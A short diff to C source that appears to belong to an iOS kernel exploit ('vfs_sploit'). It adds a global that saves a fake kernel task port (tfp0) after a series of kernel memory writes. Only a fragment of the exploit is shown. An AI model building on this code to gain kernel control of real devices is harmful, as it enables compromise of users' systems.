@@ -15,6 +15,8 @@
 #include "offsets.h"
 #include "kmem.h"
 
+mach_port_t empty_list_tfp0 = 0;
+
 void increase_limits() {
   struct rlimit lim = {0};
   int err = getrlimit(RLIMIT_NOFILE, &lim);
@@ -1045,6 +1047,7 @@ void vfs_sploit() {
   wk64(pipe + 0x08, 0);
   wk64(pipe + 0x10, 0);
   close(vfs_fd);
+  empty_list_tfp0 = fake_tfp0;
   
   printf("done!\n");
   
